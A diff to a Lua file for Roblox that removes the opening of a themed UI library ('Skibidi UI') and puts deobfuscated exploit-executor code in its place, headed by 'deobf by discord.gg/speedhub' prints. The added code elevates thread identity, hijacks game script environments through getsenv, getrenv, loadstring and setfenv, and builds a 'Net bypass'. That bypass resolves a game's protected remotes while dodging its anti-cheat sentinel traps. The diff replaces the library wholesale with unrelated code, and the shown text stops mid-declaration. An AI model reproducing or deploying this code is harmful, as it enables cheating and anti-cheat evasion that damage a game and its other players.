@@ -1,6347 +1,11413 @@
--- ============================================================
--- Skibidi UI  |  Self-contained loadstring library (skibidi edition)
--- Usage:
--- local Skibidi = loadstring(game:HttpGet("https://raw.githubusercontent.com/blookzz/skibidi/refs/heads/main/UILib.lua"))()
--- ============================================================
-
-local Skibidi = {}
-Skibidi.Brand   = "skibidi"
-Skibidi.Name    = "Skibidi UI"
-Skibidi.Version = "skibidi-2.2.0"
-
--- ============================================================
--- SERVICES
--- ============================================================
-local TweenService     = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local HttpService      = game:GetService("HttpService")
-local GuiService       = game:GetService("GuiService")
-local TextService      = game:GetService("TextService")
-local RunService       = game:GetService("RunService")
-local Players          = game:GetService("Players")
-local LocalPlayer      = Players.LocalPlayer
-local PlayerGui        = LocalPlayer:WaitForChild("PlayerGui")
-
--- ============================================================
--- THEME  (matches the gold/dark reference style by default)
--- Override any key before calling Create functions:
---   Skibidi.Theme.Accent = Color3.fromRGB(120, 80, 220)
--- ============================================================
-local Theme = {
-	-- Surfaces
-	Bg0              = Color3.fromRGB(12,  12,  12),
-	Bg1              = Color3.fromRGB(18,  18,  18),
-	Bg2              = Color3.fromRGB(26,  26,  26),
-	Bg3              = Color3.fromRGB(20,  19,  15),
-
-	-- Accent  (gold default — swap to any Color3)
-	Accent           = Color3.fromRGB(220, 160,  60),
-	AccentDim        = Color3.fromRGB(100,  72,  28),
-	AccentSec        = Color3.fromRGB(255, 200,  90),
-
-	-- Toggle
-	ToggleOff        = Color3.fromRGB(38,  34,  26),
-	ToggleOn         = Color3.fromRGB(180, 120,  40),
-	Knob             = Color3.fromRGB(255, 220, 140),
-
-	-- Interaction
-	Hover            = Color3.fromRGB(32,  30,  24),
-	ToggleW          = 40,
-	ToggleH          = 20,
-	KnobSz           = 16,
-
-	-- Text
-	TextPrimary      = Color3.fromRGB(235, 215, 170),
-	TextMuted        = Color3.fromRGB(100,  85,  60),
-	ActiveTabText    = Color3.fromRGB(255, 255, 225),
-
-	-- Input
-	InputBg          = Color3.fromRGB(14,  13,  10),
-
-	-- Sizing
-	HeaderHeight     = 36,
-	TabHeight        = 37,
-	RowHeight        = 34,
-	CornerRadius     = 10,
-	CornerRadiusSmall = 8,
-	CornerRadiusXs   = 6,
-	Padding          = 12,
-	PaddingSmall     = 6,
-	FontBold         = Enum.Font.GothamBlack,
-	FontMedium       = Enum.Font.GothamBold,
-	FontRegular      = Enum.Font.Gotham,
-	-- Gotham/GothamBold/GothamBlack only cover a limited (mostly Latin)
-	-- glyph set. Arrows, chevrons, and checkmarks fall outside that set
-	-- and render as tofu boxes. SourceSansBold has full coverage for
-	-- these symbols, so it's used anywhere a glyph "icon" is drawn.
-	FontIcon         = Enum.Font.SourceSansBold,
-	TitleSize        = 14,
-	BodySize         = 13,
-	SmallSize        = 12,
-	CaptionSize      = 11,
-
-	-- ── Semantic colours (notifications, badges, status dots) ──
-	Success          = Color3.fromRGB( 70, 200, 120),
-	Warning          = Color3.fromRGB(240, 180,  60),
-	Danger           = Color3.fromRGB(230,  75,  75),
-	Info             = Color3.fromRGB( 80, 160, 240),
-
-	-- ── Decoration switches ────────────────────────────────────
-	-- Every one of these can be turned off individually if a game's
-	-- performance budget is tight; nothing else in the library depends
-	-- on them being enabled.
-	Glow             = true,   -- soft accent bloom behind panels/controls
-	GlowStrength     = 0.72,   -- transparency of the bloom (0 = solid, 1 = off)
-	AnimatedBorder   = true,   -- slowly rotating gradient on panel strokes
-	BorderSpeed      = 22,     -- degrees per second for the above
-	Ripple           = true,   -- click ripple on buttons/rows
-	Shine            = true,   -- diagonal light sweep across hovered buttons
-	Grain            = true,   -- faint texture over large surfaces
-	GrainStrength    = 0.965,  -- ImageTransparency of the texture layer
-	Blur             = false,  -- global 3D blur while any panel is open
-	Gloss            = true,   -- vertical light gradient over cards and rows
-	LitEdge          = true,   -- outlines that catch light along their top edge
-	StrokeAlpha      = 0.34,   -- resting transparency of those outlines
-	Stagger          = true,   -- staggered pop-in as rows are built
-	Elevation        = 0.38,   -- panel drop-shadow strength (0 = pitch black)
-	Flow             = true,   -- travelling shimmer across progress fills
-	FlowSpeed        = 0.55,   -- gradient offsets per second for the above
-
-	-- Gradient endpoints used for accent fills (slider fill, active tab,
-	-- progress bars). Left nil = derived automatically from Accent.
-	AccentGrad1      = nil,
-	AccentGrad2      = nil,
-
-	-- Asset ids (swap if your executor blocks these)
-	ShadowAsset      = "rbxassetid://6014261993",
-	GlowAsset        = "rbxassetid://5028857084",
-	GrainAsset       = "rbxassetid://9968344227",
-	RippleAsset      = "rbxassetid://266543268",
-	SpinnerAsset     = "rbxassetid://4965945816",
-}
-Skibidi.Theme = Theme
-
--- ============================================================
--- THEME PRESETS
--- Skibidi.SetTheme("neon")            -- swap the whole palette
--- Skibidi.SetTheme({ Accent = ... })  -- or merge in your own keys
---
--- Themes are read at *construction* time, so call this before you
--- create any panels. Existing widgets keep the palette they were
--- built with.
--- ============================================================
-local Presets = {
-	gold = {
-		Bg0 = Color3.fromRGB(12,12,12), Bg1 = Color3.fromRGB(18,18,18),
-		Bg2 = Color3.fromRGB(26,26,26), Bg3 = Color3.fromRGB(20,19,15),
-		Accent = Color3.fromRGB(220,160,60), AccentDim = Color3.fromRGB(100,72,28),
-		AccentSec = Color3.fromRGB(255,200,90), ToggleOff = Color3.fromRGB(38,34,26),
-		ToggleOn = Color3.fromRGB(180,120,40), Knob = Color3.fromRGB(255,220,140),
-		Hover = Color3.fromRGB(32,30,24), TextPrimary = Color3.fromRGB(235,215,170),
-		TextMuted = Color3.fromRGB(100,85,60), ActiveTabText = Color3.fromRGB(255,255,225),
-		InputBg = Color3.fromRGB(14,13,10),
-	},
-	midnight = {
-		Bg0 = Color3.fromRGB(10,11,16), Bg1 = Color3.fromRGB(16,18,26),
-		Bg2 = Color3.fromRGB(24,27,38), Bg3 = Color3.fromRGB(19,21,30),
-		Accent = Color3.fromRGB(96,140,255), AccentDim = Color3.fromRGB(42,58,110),
-		AccentSec = Color3.fromRGB(158,190,255), ToggleOff = Color3.fromRGB(32,36,50),
-		ToggleOn = Color3.fromRGB(66,102,205), Knob = Color3.fromRGB(214,228,255),
-		Hover = Color3.fromRGB(32,37,52), TextPrimary = Color3.fromRGB(214,222,240),
-		TextMuted = Color3.fromRGB(104,116,145), ActiveTabText = Color3.fromRGB(255,255,255),
-		InputBg = Color3.fromRGB(12,14,21),
-	},
-	neon = {
-		Bg0 = Color3.fromRGB(8,10,12), Bg1 = Color3.fromRGB(13,17,20),
-		Bg2 = Color3.fromRGB(20,26,30), Bg3 = Color3.fromRGB(15,20,23),
-		Accent = Color3.fromRGB(60,240,200), AccentDim = Color3.fromRGB(22,96,84),
-		AccentSec = Color3.fromRGB(150,255,232), ToggleOff = Color3.fromRGB(26,34,38),
-		ToggleOn = Color3.fromRGB(38,170,144), Knob = Color3.fromRGB(198,255,242),
-		Hover = Color3.fromRGB(26,36,40), TextPrimary = Color3.fromRGB(214,238,232),
-		TextMuted = Color3.fromRGB(88,124,118), ActiveTabText = Color3.fromRGB(240,255,252),
-		InputBg = Color3.fromRGB(10,14,16),
-	},
-	rose = {
-		Bg0 = Color3.fromRGB(16,10,14), Bg1 = Color3.fromRGB(23,15,20),
-		Bg2 = Color3.fromRGB(33,22,29), Bg3 = Color3.fromRGB(26,17,23),
-		Accent = Color3.fromRGB(244,114,160), AccentDim = Color3.fromRGB(112,45,72),
-		AccentSec = Color3.fromRGB(255,175,205), ToggleOff = Color3.fromRGB(44,29,38),
-		ToggleOn = Color3.fromRGB(190,80,124), Knob = Color3.fromRGB(255,214,230),
-		Hover = Color3.fromRGB(43,29,38), TextPrimary = Color3.fromRGB(240,220,230),
-		TextMuted = Color3.fromRGB(130,96,112), ActiveTabText = Color3.fromRGB(255,240,246),
-		InputBg = Color3.fromRGB(18,11,15),
-	},
-	emerald = {
-		Bg0 = Color3.fromRGB(9,14,11), Bg1 = Color3.fromRGB(14,21,17),
-		Bg2 = Color3.fromRGB(22,32,26), Bg3 = Color3.fromRGB(17,25,20),
-		Accent = Color3.fromRGB(72,205,120), AccentDim = Color3.fromRGB(30,92,54),
-		AccentSec = Color3.fromRGB(146,240,180), ToggleOff = Color3.fromRGB(28,40,32),
-		ToggleOn = Color3.fromRGB(50,150,90), Knob = Color3.fromRGB(200,250,220),
-		Hover = Color3.fromRGB(28,42,33), TextPrimary = Color3.fromRGB(216,236,224),
-		TextMuted = Color3.fromRGB(96,126,108), ActiveTabText = Color3.fromRGB(240,255,246),
-		InputBg = Color3.fromRGB(11,17,13),
-	},
-	crimson = {
-		Bg0 = Color3.fromRGB(15,9,9), Bg1 = Color3.fromRGB(22,14,14),
-		Bg2 = Color3.fromRGB(32,21,21), Bg3 = Color3.fromRGB(25,16,16),
-		Accent = Color3.fromRGB(232,76,76), AccentDim = Color3.fromRGB(110,34,34),
-		AccentSec = Color3.fromRGB(255,146,146), ToggleOff = Color3.fromRGB(44,27,27),
-		ToggleOn = Color3.fromRGB(180,55,55), Knob = Color3.fromRGB(255,208,208),
-		Hover = Color3.fromRGB(43,27,27), TextPrimary = Color3.fromRGB(238,218,218),
-		TextMuted = Color3.fromRGB(128,92,92), ActiveTabText = Color3.fromRGB(255,240,240),
-		InputBg = Color3.fromRGB(17,10,10),
-	},
-	violet = {
-		Bg0 = Color3.fromRGB(13,10,18), Bg1 = Color3.fromRGB(19,15,27),
-		Bg2 = Color3.fromRGB(28,22,40), Bg3 = Color3.fromRGB(22,17,31),
-		Accent = Color3.fromRGB(160,110,250), AccentDim = Color3.fromRGB(70,44,124),
-		AccentSec = Color3.fromRGB(203,172,255), ToggleOff = Color3.fromRGB(38,30,53),
-		ToggleOn = Color3.fromRGB(122,80,200), Knob = Color3.fromRGB(226,210,255),
-		Hover = Color3.fromRGB(38,30,54), TextPrimary = Color3.fromRGB(226,218,242),
-		TextMuted = Color3.fromRGB(116,104,142), ActiveTabText = Color3.fromRGB(248,244,255),
-		InputBg = Color3.fromRGB(15,11,21),
-	},
-	mono = {
-		Bg0 = Color3.fromRGB(10,10,10), Bg1 = Color3.fromRGB(17,17,17),
-		Bg2 = Color3.fromRGB(26,26,26), Bg3 = Color3.fromRGB(21,21,21),
-		Accent = Color3.fromRGB(225,225,225), AccentDim = Color3.fromRGB(80,80,80),
-		AccentSec = Color3.fromRGB(255,255,255), ToggleOff = Color3.fromRGB(38,38,38),
-		ToggleOn = Color3.fromRGB(150,150,150), Knob = Color3.fromRGB(255,255,255),
-		Hover = Color3.fromRGB(32,32,32), TextPrimary = Color3.fromRGB(228,228,228),
-		TextMuted = Color3.fromRGB(115,115,115), ActiveTabText = Color3.fromRGB(255,255,255),
-		InputBg = Color3.fromRGB(12,12,12),
-	},
-}
-Skibidi.Presets = Presets
-
-function Skibidi.SetTheme(nameOrTable)
-	local src = nameOrTable
-	if type(src) == "string" then src = Presets[src:lower()] end
-	if type(src) ~= "table" then return Theme end
-	for k, v in pairs(src) do Theme[k] = v end
-	-- A palette swap invalidates any hand-tuned gradient endpoints.
-	if type(nameOrTable) == "string" then
-		Theme.AccentGrad1, Theme.AccentGrad2 = nil, nil
-	end
-	return Theme
+print("deobf by discord.gg/speedhub")
+print("neymarish the goat")
+print("deobf by discord.gg/speedhub")
+print("neymarish the goat")
+print("deobf by discord.gg/speedhub")
+
+local fn26, fn27, TweenService, RunService, Stats, localPlayer, genv, fn28, tbl17
+local createUICorner, createUIStroke, screenGui, n31, frame, flag14
+
+do
+  do
+    local fn29, createFrame
+
+    do
+      local aceRemoteMapper, genv2, fn30, ReplicatedStorage
+
+      do
+        local concat, tbl18
+
+        do
+          do
+            do
+            end
+
+            do
+              local function fn31(arg)
+                local tbl19 = {}
+
+                if type(gethui) == "function" then
+                  local ok, result = pcall(gethui)
+
+                  if ok and result then
+                    tbl19[#tbl19 + 1] = result
+                  end
+                end
+
+                local ok, result = pcall(function()
+                  return game:GetService("CoreGui")
+                end)
+
+                if ok and result then
+                  tbl19[#tbl19 + 1] = result
+                end
+
+                if arg then
+                  tbl19[#tbl19 + 1] = arg
+                end
+
+                return tbl19
+              end
+
+              fn29 = function(arg, arg2)
+                for _, v75 in ipairs(fn31(arg2)) do
+                  pcall(function()
+                    arg.Parent = v75
+                  end)
+
+                  if arg.Parent == v75 then
+                    return v75
+                  end
+                end
+
+                return arg.Parent
+              end
+
+              fn30 = function(arg, ...)
+                local v75 = fn31(arg)
+
+                for _, v76 in ipairs({ ... }) do
+                  for _, v77 in ipairs(v75) do
+                    pcall(function()
+                      local v78 = v77:FindFirstChild(v76)
+
+                      if v78 then
+                        v78:Destroy()
+                      end
+                    end)
+                  end
+                end
+              end
+            end
+          end
+
+          createFrame = function(parent, arg)
+            local tbl19 = arg or {}
+            local aceFallingDots = parent:FindFirstChild("ACEFallingDots")
+
+            if aceFallingDots then
+              aceFallingDots:Destroy()
+            end
+
+            local frame2 = Instance.new("Frame")
+            frame2.Name = "ACEFallingDots"
+            frame2.Size = UDim2.fromScale(1, 1)
+            frame2.BackgroundTransparency = 1
+            frame2.BorderSizePixel = 0
+            frame2.ClipsDescendants = true
+            frame2.Active = false
+            frame2.ZIndex = tbl19.ZIndex or 90
+            frame2.Parent = parent
+            local service = game:GetService("UserInputService")
+            local TweenService2 = game:GetService("TweenService")
+            local count = tbl19.Count or service.TouchEnabled and not service.KeyboardEnabled and 10 or 18
+            local v75 = Random.new()
+            local flag15 = true
+
+            frame2.Destroying:Connect(function()
+              flag15 = false
+            end)
+
+            for i = 1, count do
+              task.spawn(function()
+                local frame3 = Instance.new("Frame")
+                frame3.Name = "FallingDot"
+                frame3.AnchorPoint = Vector2.new(0.5, 0.5)
+                frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                frame3.BorderSizePixel = 0
+                frame3.Active = false
+                frame3.Visible = false
+                frame3.ZIndex = frame2.ZIndex + 1
+                frame3.Parent = frame2
+                local instance = Instance.new("UICorner")
+                instance.CornerRadius = UDim.new(1, 0)
+                instance.Parent = frame3
+                task.wait(v75:NextNumber(0, tbl19.InitialSpread or 4.5))
+
+                while flag15 and frame2.Parent and parent.Parent do
+                  local screenGui2 = parent:FindFirstAncestorOfClass("ScreenGui")
+
+                  if (not screenGui2 or screenGui2.Enabled) and frame2.Visible then
+                    local v76 = v75:NextInteger(2, 4)
+                    local v77 = v75:NextNumber(0.03, 0.97)
+                    local v78 = 0.98
+                    local n32 = math.clamp(v77 + v75:NextNumber(-0.15, 0.1), 0.02, v78)
+                    local v79 = v75:NextNumber(tbl19.MinDuration or 4.8, tbl19.MaxDuration or 8.2)
+                    frame3.Size = UDim2.fromOffset(v76, v76)
+                    frame3.Position = UDim2.new(v77, 0, -0.1, -v76)
+                    frame3.BackgroundTransparency = v75:NextNumber(0.28, 0.58)
+                    frame3.Visible = true
+
+                    local tween = TweenService2:Create(frame3, TweenInfo.new(v79, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
+                      Position = UDim2.new(n32, 0, 1.06, v76),
+                      BackgroundTransparency = v75:NextNumber(0.48, 0.76),
+                    })
+
+                    tween:Play()
+                    tween.Completed:Wait()
+                    frame3.Visible = false
+                  else
+                    frame3.Visible = false
+                    task.wait(0.35)
+                  end
+
+                  task.wait(v75:NextNumber(0.12, 0.45))
+                end
+
+                if frame3.Parent then
+                  frame3:Destroy()
+                end
+              end)
+            end
+
+            return frame2
+          end
+
+          genv2 = getgenv and getgenv() or _G
+          ReplicatedStorage = cloneref and cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
+          aceRemoteMapper = type(genv2.ACERemoteMapper) == "table" and genv2.ACERemoteMapper
+            or type(genv2._RaVeNet) == "table" and genv2._RaVeNet
+            or type(_G._RaVeNet) == "table" and _G._RaVeNet
+            or {}
+          concat = table.concat
+          tbl18 = {}
+
+          do
+            local str7 = tostring(game.GameId)
+            local str8 = tostring(game.PlaceId)
+            local v75 = tostring
+            local jobId = game.JobId
+            tbl18[1] = str7
+            tbl18[2] = str8
+
+            do
+              local values = table.pack(v75(jobId))
+              table.move(values, 1, values.n, 3, tbl18)
+            end
+          end
+        end
+
+        do
+          local v75 = concat(tbl18, ":")
+          aceRemoteMapper.generation = tonumber(aceRemoteMapper.generation) or 0
+
+          if aceRemoteMapper.session ~= v75 then
+            aceRemoteMapper.generation = aceRemoteMapper.generation + 1
+            aceRemoteMapper.bypass = nil
+            aceRemoteMapper.cache = {}
+            aceRemoteMapper.pending = {}
+            aceRemoteMapper.blocked = false
+            aceRemoteMapper.buildFailedAt = nil
+            aceRemoteMapper.lastError = nil
+          end
+
+          aceRemoteMapper.session = v75
+        end
+      end
+
+      do
+        local fn31
+
+        do
+          aceRemoteMapper.reps = ReplicatedStorage
+          aceRemoteMapper.layers = tonumber(aceRemoteMapper.layers) or 2
+          aceRemoteMapper.buildRetryGap = tonumber(aceRemoteMapper.buildRetryGap) or 15
+          aceRemoteMapper.cache = type(aceRemoteMapper.cache) == "table" and aceRemoteMapper.cache or {}
+          aceRemoteMapper.pending = type(aceRemoteMapper.pending) == "table" and aceRemoteMapper.pending or {}
+          aceRemoteMapper.sentinel = "068a6294"
+          aceRemoteMapper.resolveCount = tonumber(aceRemoteMapper.resolveCount) or 0
+          aceRemoteMapper.cacheHits = tonumber(aceRemoteMapper.cacheHits) or 0
+          aceRemoteMapper.allowProtectedBuild = false
+          aceRemoteMapper.bypass = nil
+          genv2.GreenDuelsNetBypass = nil
+          _G.GreenDuelsNetBypass = nil
+
+          do
+            local tbl18 = {
+              getgenv = true,
+              getrenv = true,
+              getsenv = true,
+              getreg = true,
+              getgc = true,
+              filtergc = true,
+              cloneref = true,
+              compareinstances = true,
+              gethui = true,
+              loadstring = true,
+              newcclosure = true,
+              hookfunction = true,
+              hookmetamethod = true,
+              replaceclosure = true,
+              restorefunction = true,
+              checkcaller = true,
+              isexecutorclosure = true,
+              isourclosure = true,
+              islclosure = true,
+              iscclosure = true,
+              clonefunction = true,
+              getcallingscript = true,
+              getscriptclosure = true,
+              getscriptbytecode = true,
+              getconnections = true,
+              firesignal = true,
+              fireproximityprompt = true,
+              firetouchinterest = true,
+              getnamecallmethod = true,
+              setnamecallmethod = true,
+              setthreadidentity = true,
+              getthreadidentity = true,
+              setidentity = true,
+              getidentity = true,
+              identifyexecutor = true,
+              getexecutorname = true,
+              writefile = true,
+              readfile = true,
+              appendfile = true,
+              isfile = true,
+              delfile = true,
+              listfiles = true,
+              makefolder = true,
+              isfolder = true,
+              delfolder = true,
+              getcustomasset = true,
+              saveinstance = true,
+              request = true,
+              http_request = true,
+              setclipboard = true,
+              queue_on_teleport = true,
+              decompile = true,
+              syn = true,
+              crypt = true,
+              WebSocket = true,
+              Drawing = true,
+            }
+
+            fn31 = function(arg, arg2)
+              local tbl19 = {}
+
+              for k, v75 in pairs(arg) do
+                if not tbl18[k] then
+                  if not (type(v75) == "function" and type(isexecutorclosure) == "function" and isexecutorclosure(v75)) then
+                    tbl19[k] = v75
+                  end
+                end
+              end
+
+              rawset(tbl19, "script", arg2)
+              rawset(tbl19, "shared", shared)
+              return tbl19
+            end
+          end
+        end
+
+        do
+          local function fn32(arg)
+            local v75 = "Instance"
+            if typeof(arg) ~= v75 or type(getsenv) ~= "function" then
+              return nil
+            end
+
+            if arg:IsA("ModuleScript") then
+              pcall(require, arg)
+            end
+
+            local ok, result = pcall(getsenv, arg)
+            local flag15 = ok and type(result) == "table"
+
+            if flag15 then
+              local v76 = "Instance"
+              flag15 = typeof(rawget(result, "script")) == v76
+            end
+
+            if flag15 then
+              return result
+            end
+            return nil
+          end
+
+          aceRemoteMapper.PickEnv = function(arg)
+            local controllers = arg.reps:FindFirstChild("Controllers")
+            local animals = arg.reps:FindFirstChild("Datas")
+            local tbl18 = {}
+            local v75 = controllers and controllers:FindFirstChild("LiveboardController")
+            controllers = controllers and controllers:FindFirstChild("AnimalController")
+            animals = animals and animals:FindFirstChild("Animals")
+            tbl18[1] = v75
+            tbl18[2] = controllers
+            tbl18[3] = animals
+            local v76 = nil
+
+            for i = 1, #tbl18 do
+              local v77 = tbl18[i]
+              if typeof(v77) ~= "Instance" then
+                continue
+              end
+              v76 = v76 or v77
+              local v78 = fn32(v77)
+              if v78 then
+                return v78, v77
+              end
+            end
+
+            if not v76 or type(getrenv) ~= "function" then
+              return nil, nil
+            end
+            local ok, result = pcall(getrenv)
+            local flag15 = not ok
+            local flag16
+
+            if flag15 then
+              flag16 = flag15
+            else
+              local v77 = "table"
+              flag16 = type(result) ~= v77
+            end
+
+            if flag16 then
+              return nil, nil
+            end
+            return fn31(result, v76), v76
+          end
+        end
+      end
+
+      aceRemoteMapper.Build = function(arg)
+        if arg.blocked then
+          return nil
+        end
+
+        if not arg.allowProtectedBuild then
+          arg.lastError = "protected build disabled"
+          return nil
+        end
+
+        if arg.bypass then
+          return arg.bypass
+        end
+        local buildFailedAt = arg.buildFailedAt
+
+        if buildFailedAt then
+          local buildFailedAt2 = arg.buildFailedAt
+          buildFailedAt = os.clock() - buildFailedAt2 < arg.buildRetryGap
+        end
+
+        if buildFailedAt then
+          return nil
+        end
+        local bypass = nil
+
+        local ok, result = pcall(function()
+          if type(loadstring) ~= "function" or type(setfenv) ~= "function" then
+            error("loadstring/setfenv unavailable", 0)
+          end
+
+          local Net = require(arg.reps.Packages.Net)
+
+          if type(Net) ~= "table" then
+            error("Packages.Net did not return a table", 0)
+          end
+
+          local v75, v76 = arg:PickEnv()
+
+          if not v75 or not v76 then
+            error("invalid input", 0)
+          end
+
+          local n32 = math.max(1, math.floor(arg.layers))
+
+          local tbl18 = {
+            "return function(__env, __out, __func, ...)",
+            "\tsetfenv(0, __env)",
+            ("\tlocal function l%d(...) return __func(...) end"):format(n32),
+          }
+
+          for i = n32 - 1, 1, -1 do
+            tbl18[#tbl18 + 1] = ("\tlocal function l%d(...) return l%d(...) end"):format(i, i + 1)
+          end
+
+          tbl18[#tbl18 + 1] = "\t__out.result = table.pack(pcall(l1, ...))"
+          tbl18[#tbl18 + 1] = "\t__out.done = true"
+          tbl18[#tbl18 + 1] = "end"
+          local chunk, v77 = loadstring(table.concat(tbl18, "\n"), "=" .. v76:GetFullName())
+
+          if not chunk then
+            error(v77 or "compile failed", 0)
+          end
+
+          setfenv(chunk, v75)
+          local v78 = chunk()
+          local v79 = getthreadidentity or getidentity
+          local v80 = setthreadidentity or setidentity
+          local flag15 = type(v79) ~= "function"
+          local flag16
+
+          if flag15 then
+            flag16 = flag15
+          else
+            local v81 = "function"
+            flag16 = type(v80) ~= v81
+          end
+
+          if flag16 then
+            error("thread identity functions unavailable", 0)
+          end
+
+          local function fn31(arg2, ...)
+            local tbl19 = {}
+            local v81 = v79()
+            local ok, result = pcall(v80, 2)
+
+            if not ok then
+              error(result, 3)
+            end
+
+            local thread = coroutine.create(v78)
+            local resume = coroutine.resume
+            local v82 = table.pack(...)
+            local v83 = v75
+            v82.n = 5 + v82.n - 1
+            table.move(v82, 1, v82.n, 5, v82)
+            v82[1] = thread
+            v82[2] = v83
+            v82[3] = tbl19
+            v82[4] = arg2
+            local v84, v85 = resume(table.unpack(v82, 1, v82.n))
+            pcall(v80, v81)
+
+            if not v84 then
+              error(v85, 3)
+            end
+
+            local n33 = os.clock() + 15
+
+            while not tbl19.done and coroutine.status(thread) ~= "dead" and os.clock() < n33 do
+              task.wait()
+            end
+
+            local result2 = tbl19.result
+
+            if not result2 then
+              error("no remote", 3)
+            end
+
+            if not result2[1] then
+              error(result2[2], 3)
+            end
+
+            return table.unpack(result2, 2, result2.n)
+          end
+
+          local tbl19 = {}
+
+          bypass = setmetatable({}, {
+            __index = function(arg2, arg3)
+              local v81 = tbl19[arg3]
+              if v81 ~= nil then
+                return v81
+              end
+              local v82 = Net[arg3]
+              if type(v82) ~= "function" then
+                tbl19[arg3] = v82
+                return v82
+              end
+
+              local function fn32(arg4, ...)
+                if arg4 == arg2 or arg4 == Net then
+                  return fn31(v82, Net, ...)
+                end
+                return fn31(v82, Net, arg4, ...)
+              end
+
+              tbl19[arg3] = fn32
+              return fn32
+            end,
+            __metatable = "Instance",
+          })
+        end)
+
+        arg.bypass = bypass
+
+        if bypass then
+          arg.buildFailedAt = nil
+          arg.lastError = nil
+        else
+          arg.buildFailedAt = os.clock()
+          arg.lastError = tostring(result)
+        end
+
+        genv2.GreenDuelsNetBypass = bypass
+        _G.GreenDuelsNetBypass = bypass
+        return bypass
+      end
+
+      aceRemoteMapper.Trip = function(arg, raVeNetBlockReason)
+        arg.generation = arg.generation + 1
+        arg.blocked = true
+        arg.bypass = nil
+        arg.buildFailedAt = os.clock()
+        arg.lastError = "blocked: " .. tostring(raVeNetBlockReason)
+        genv2.GreenDuelsNetBypass = nil
+        genv2._RaVeNetBlockReason = raVeNetBlockReason
+        _G.GreenDuelsNetBypass = nil
+        _G._RaVeNetBlockReason = raVeNetBlockReason
+      end
+
+      aceRemoteMapper.IsSentinel = function(arg, arg2)
+        return type(arg2) == "string" and arg2:find(arg.sentinel, 1, true) ~= nil
+      end
+
+      aceRemoteMapper.Register = function(arg, arg2, arg3, arg4)
+        local v75 = "function"
+        if type(arg2) ~= v75 or type(arg3) ~= "string" then
+          return nil
+        end
+
+        if typeof(arg4) ~= "Instance" or not arg4:IsA(arg2) or not arg4.Parent then
+          return nil
+        end
+        arg.cache[arg2 .. "|" .. arg3] = arg4
+        return arg4
+      end
+
+      aceRemoteMapper.Resolve = function(arg, arg2, arg3, arg4)
+        local flag15 = arg2 ~= "RemoteEvent" and arg2 ~= "RemoteFunction" and arg2 ~= "UnreliableRemoteEvent"
+
+        if not flag15 then
+          local v75 = "function"
+          flag15 = type(arg3) ~= v75
+        end
+
+        if flag15 or arg3 == "" then
+          arg.lastError = "invalid remote request"
+          return nil
+        end
+        local resolveTimedOut = arg2 .. "|" .. arg3
+        local v75 = arg.cache[resolveTimedOut]
+        if typeof(v75) == "Instance" and v75:IsA(arg2) and v75.Parent then
+          arg.cacheHits = arg.cacheHits + 1
+          return v75
+        end
+        arg.cache[resolveTimedOut] = nil
+        if arg.blocked or not arg.allowProtectedBuild or not arg:Build() then
+          return nil
+        end
+        local tbl18 = arg.pending[resolveTimedOut]
+
+        if not tbl18 then
+          tbl18 = { Done = false, Found = nil, Error = nil, Generation = arg.generation }
+          arg.pending[resolveTimedOut] = tbl18
+
+          task.spawn(function()
+            local ok, found = pcall(function()
+              local bypass = arg.bypass and arg.bypass[arg2]
+
+              if type(bypass) ~= "function" then
+                error(arg2 .. " resolver unavailable", 0)
+              end
+
+              return bypass(arg.bypass, arg3)
+            end)
+
+            if tbl18.Generation ~= arg.generation then
+              tbl18.Done = true
+
+              if arg.pending[resolveTimedOut] == tbl18 then
+                arg.pending[resolveTimedOut] = nil
+              end
+
+              return
+            end
+
+            if ok and typeof(found) == "Instance" and found:IsA(arg2) and found.Parent then
+              if arg:IsSentinel(found.Name) then
+                arg:Trip("sentinel remote")
+              else
+                tbl18.Found = found
+                arg.cache[resolveTimedOut] = found
+                arg.resolveCount = arg.resolveCount + 1
+              end
+            else
+              tbl18.Error = tostring(found)
+              arg.lastError = tbl18.Error
+
+              if arg:IsSentinel(tbl18.Error) then
+                arg:Trip("sentinel response")
+              end
+            end
+
+            tbl18.Done = true
+
+            if arg.pending[resolveTimedOut] == tbl18 then
+              arg.pending[resolveTimedOut] = nil
+            end
+          end)
+        end
+
+        local n32 = math.max(0, tonumber(arg4) or 5)
+        local n33 = 0
+
+        while not tbl18.Done and n33 < n32 do
+          task.wait(0.05)
+          n33 += 0.05
+        end
+
+        if not tbl18.Done then
+          arg.lastError = "resolve timed out: " .. resolveTimedOut
+        end
+
+        return tbl18.Found
+      end
+
+      aceRemoteMapper.Reset = function(arg)
+        arg.generation = arg.generation + 1
+        arg.bypass = nil
+        arg.cache = {}
+        arg.pending = {}
+        arg.blocked = false
+        arg.buildFailedAt = nil
+        arg.lastError = nil
+        arg.resolveCount = 0
+        arg.cacheHits = 0
+        arg.allowProtectedBuild = false
+        genv2.GreenDuelsNetBypass = nil
+        genv2._RaVeNetBlockReason = nil
+        _G.GreenDuelsNetBypass = nil
+        _G._RaVeNetBlockReason = nil
+      end
+
+      aceRemoteMapper.SetProtectedRoutingEnabled = function(arg, arg2)
+        arg.allowProtectedBuild = arg2 == true
+
+        if arg.allowProtectedBuild then
+          arg.blocked = false
+          arg.buildFailedAt = nil
+          arg.lastError = nil
+        else
+          arg.bypass = nil
+        end
+
+        return arg.allowProtectedBuild
+      end
+
+      aceRemoteMapper.GetStatus = function(arg)
+        local n32 = 0
+
+        for k in pairs(arg.cache) do
+          n32 += 1
+        end
+
+        local n33 = 0
+
+        for k in pairs(arg.pending) do
+          n33 += 1
+        end
+
+        return {
+          Session = arg.session,
+          Ready = arg.bypass ~= nil,
+          ProtectedRouting = arg.allowProtectedBuild == true,
+          Blocked = arg.blocked == true,
+          Cached = n32,
+          Pending = n33,
+          Resolves = arg.resolveCount,
+          CacheHits = arg.cacheHits,
+          LastError = arg.lastError,
+        }
+      end
+
+      genv2.ACERemoteMapper = aceRemoteMapper
+      genv2._RaVeNet = aceRemoteMapper
+      _G.ACERemoteMapper = aceRemoteMapper
+      _G._RaVeNet = aceRemoteMapper
+
+      fn26 = function()
+        if not game:IsLoaded() then
+          game.Loaded:Wait()
+        end
+
+        local Players, service, TweenService2, RunService2, GuiService, service2, localPlayer2, playerGui, tbl18, genv3
+        local aceFinderRuntime, fn31, finderUISettingsState, tbl19, tbl20, fn32, fn33, tbl21, tweenInfo, tweenInfo2
+        local tweenInfo3, fn34, fn35, createUIStroke2, createUIPadding, createTextLabel, fn36, fn37, request_, v75
